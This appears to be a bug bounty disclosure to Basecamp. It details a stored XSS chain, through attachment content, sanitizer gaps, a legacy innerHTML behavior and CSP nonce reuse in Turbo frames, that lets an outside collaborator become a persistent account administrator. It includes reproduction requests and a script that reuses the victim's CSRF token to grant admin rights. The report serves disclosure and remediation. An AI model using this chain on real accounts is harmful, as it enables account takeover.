title: Cross-account stored XSS on app.basecamp.com leads to persistent administrator takeover

profile.name: Basecamp
profile.about: Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Created by 37signals.

vulnerability_information:
## Executive summary An outside collaborator (`O`) in one project can store a message that renders as a normal YouTube embed while carrying attacker-controlled HTML in the `content` attribute of its `bc-attachment`. When a different user, account administrator (`A`), opens that message's Edit form once, Lexxy normalizes the stored HTML and exposes a trusted legacy behavior. The behavior fetches attacker-controlled HTML and writes it with `innerHTML`. The attacker then introduces a cross-origin `turbo-frame`; Turbo loads its response and applies the victim page's CSP nonce to the embedded script. JavaScript therefore executes in the origin `https://app.basecamp.com`. That script reads A's CSRF token and calls the administrator-grant endpoint as A. O becomes a persistent administrator of A's account. The grant remains after the victim browser is closed. The demonstrated end state is: ```text O: admin = true, owner = false Victim: remains the account owner Victim 37signals password/identity: not compromised ``` ## Test accounts All accounts, users, and content are mine. | Role | Person ID | Basecamp account | Access in victim account | |---|---:|---:|---| | Victim administrator (`A`) | `53379754` | `6301766` | Account owner/admin | | External attacker (`O`) | `53489491` | `6314604` | Outside collaborator in one project | | State | Account `6301766` | |---|---| | Before the trigger | O has only project-level access as an outside collaborator in project `49452064`; O has no team, administrator, account-settings, or other-project access. | | After the trigger | O is persistently `admin: true`, `owner: false`; O can manage administrators, people, project access, and account settings. | The initial role was also checked directly from O's session: O appeared in the project participant list, was absent from the account administrator list, and received `403` from account-administration routes, including a direct attempt to grant administrator access. The victim remains the account owner. O does not obtain A's password or the global 37signals identity. ## Preconditions and attack model - O controls a Basecamp account and is an outside collaborator with permission to post a message in one victim project. - A account administrator opens the stored message's Edit form once. - O controls an HTTPS origin that can return CORS-enabled HTML and the Turbo frame response. - O needs no victim password, session cookie, CSRF token, or second click. The message is stored. If another victim administrator opens the same Edit form later, the same script executes in that administrator's session. ## Proof package The end-to-end screen recording is the primary proof: {F7193504} ### Separate attacker account O is signed in to the independent Basecamp account `6314604`. The Adminland button visible on this page belongs to O's own account; it is not the victim's account `6301766`. {F7193507} ### Stored message renders normally O stores the payload in the victim project. The reader view displays a normal YouTube embed and attributes the message to `H1 Outsider`. {F7193508} ### Native JavaScript execution The victim opens Edit. The Chrome address bar is still on `app.basecamp.com`, and the native dialog displays the result of `alert(document.domain)`: ```text app.basecamp.com ``` {F7193510} ### Persistent Adminland access after the victim session The XSS grants O administrator privileges using A's authenticated session. After the victim browser is closed, O can still open Adminland for account `6301766`. {F7193511} ### O can add/remove administrators O exercises the stolen privilege and promotes another member (`demo`, person `53379769`) to administrator. The list visibly includes O, the victim owner, and the newly promoted administrator. {F7193512} ### Victim account-management data O can open the victim administrator's account-management profile without the victim's browser, cookie, or password. {F7193513} ## Attack chain ```text External account O (account 6314604, person 53489491) -> outside collaborator in victim project 49452064 -> stores a valid YouTube embed and hidden bc-attachment content Victim administrator A (account 6301766, person 53379754) -> opens message 10479052766 in Edit -> Lexxy normalizes select > option > div -> data-behavior/data-url survive DOMPurify -> load_drafts_link fetches attacker HTML and assigns innerHTML -> attacker inserts -> Turbo loads the frame and copies A's CSP nonce to its script JavaScript runs as A on app.basecamp.com -> POST /account/administratorships with A's CSRF token -> server returns 302 to /6301766/account/administrators -> O becomes a persistent administrator of A's account ``` ## Reproduction 1. As O, verify that the session is attached to the independent account `6314604`, not victim account `6301766`. 2. Create a normal YouTube embed under the victim account and retain its server-generated `sgid`. 3. As O, post a message in victim project `49452064` using the payload below. 4. As victim administrator A, open the stored message's Edit URL once. 5. Observe the native `alert(document.domain)` and the same-origin POST to `/6301766/account/administratorships`. 6. Close the victim browser. Verify that O's separate account is now a persistent administrator of account `6301766`. 7. As O, perform an administrator write action by promoting person `53379769`. The `sgid` is obtained by creating a normal YouTube embed with O's authenticated session: ```http POST /6301766/embeds.json HTTP/1.1 Host: app.basecamp.com Content-Type: application/json X-CSRF-Token: {"url":"https://www.youtube.com/watch?v=dQw4w9WgXcQ"} ``` ### Payload ```html
H1XACCT cross-account proof
H1XACCT after embed
``` O stores that markup as the `content` value of a normal message: ```http POST /6301766/buckets/49452064/message_boards/10465121751/messages.json HTTP/1.1 Host: app.basecamp.com Content-Type: application/json X-CSRF-Token: { "subject": "H1XACCT independent account XSS proof", "content": "
...
...
", "status": "active" } ``` The key detail is that the nested malicious markup is encoded inside the `content` attribute. The attachment still has a valid server-generated `sgid`, so the reader view is not visibly malformed. ### Victim trigger The victim opens: ```text https://app.basecamp.com/6301766/buckets/49452064/messages/10479052766/edit ``` The attacker's `/drafts` response is inserted by `load_drafts_link`: ```html ``` The matching `/frame` response contains an inline script inside a frame with the same ID. Turbo loads the CORS-enabled response and supplies the current page nonce when activating the script. ### Administrator takeover The nonce-authorized script runs on `https://app.basecamp.com`, reads the victim's CSRF token from the page metadata, and calls: ```js const body = new URLSearchParams({ person_id: "53489491" }).toString(); await fetch("/6301766/account/administratorships", { method: "POST", credentials: "same-origin", headers: { "Content-Type": "application/x-www-form-urlencoded", "X-CSRF-Token": csrf }, body }); ``` The server responds with a `302 Found` redirect to: ```text /6301766/account/administrators ``` The grant is persistent and the grant endpoint accepts the request because it originates from the victim's own origin with the victim's valid CSRF token. After the victim browser closes, O's separate session reports: ```json { "id": 53489491, "admin": true, "owner": false } ``` O then accesses the following victim account surfaces with O's own cookie and without A's browser: ```text /6301766/account /6301766/account/administrators /6301766/account/people /6301766/account/people/users/53379754/edit /6301766/account/accesses/53379769/edit /6301766/account/retention ``` O also promotes person `53379769` to administrator. This proves persistent write access to the administrator-management surface, not merely read access or a reflected UI state. ## Root-cause analysis The exploit combines four primitives: 1. **Client-controlled attachment content is trusted.** The server preserves the supplied `bc-attachment.content` when the attachment has a valid `sgid`. Lexxy reparses that content in the editor. 2. **HTML parsing is not a sanitization boundary.** The invalid `select > option > div` sequence is normalized by the HTML parser into a live `div`, exposing attributes that were not intended to become active. 3. **Dangerous data attributes survive sanitization.** Lexxy blocks `data-controller` and `data-action` but permits `data-behavior="load_drafts_link"` and the attacker-controlled `data-url`. 4. **A trusted behavior sinks to `innerHTML`.** The legacy behavior executes: ```js BC.fetch(element.dataset.url).then(html => element.innerHTML = html) ``` The injected `turbo-frame` is then loaded by Turbo. Turbo's frame handling propagates the page's CSP nonce to the frame script, converting stored HTML injection into same-origin JavaScript execution. The application's CSRF protection does not prevent this because the script reads and reuses the victim's legitimate token from the same origin. ## Observed evidence - Native dialog: `app.basecamp.com` - Browser origin during execution: `https://app.basecamp.com` - Attacker fetches: `/drafts`, then `/frame` - JavaScript execution on the victim origin - Request: ```text POST https://app.basecamp.com/6301766/account/administratorships 302 -> /6301766/account/administrators ``` - Persisted attacker grant: ```json { "id": 53489491, "admin": true, "owner": false } ``` - Attacker administrator write: person `53379769` changed from non-admin to admin with a `302` response to `/6301766/account/administrators`. ## Suggested remediation Primary fixes: 1. Do not trust a client-supplied `bc-attachment.content` merely because its `sgid` resolves. Rebuild attachment markup server-side from the resolved object. 2. Set DOMPurify's `ALLOW_DATA_ATTR` to `false` in Lexxy, or use an explicit allowlist that excludes behavior and URL-bearing attributes. 3. Prevent legacy behaviors from consuming URLs in imported attachment content. Defense in depth: 1. Normalize HTML to a fixed point before validation and rendering. 2. Do not apply the application CSP nonce to scripts originating in attacker-controlled cross-origin Turbo frames. 3. Require step-up authentication for administrator grants and removals. 4. Add regression tests covering the attachment parser differential, `data-behavior` / `data-url`, cross-origin frames, and nonce propagation. The accounts, stored message, attacker tunnel, and administrator grants are intentionally left in place for validation. ## Impact An outside collaborator in one shared project can execute arbitrary JavaScript in an account owner/admin's authenticated session when the victim opens the message editor once. The script can read the CSRF token and perform authenticated same-origin requests as the victim. The demonstrated end state is persistent administrative control of the victim account: - add or remove administrators; - manage account people; - edit project access for account members; - open victim account-management records; - access account-level retention settings; - perform other actions available to the victim administrator.
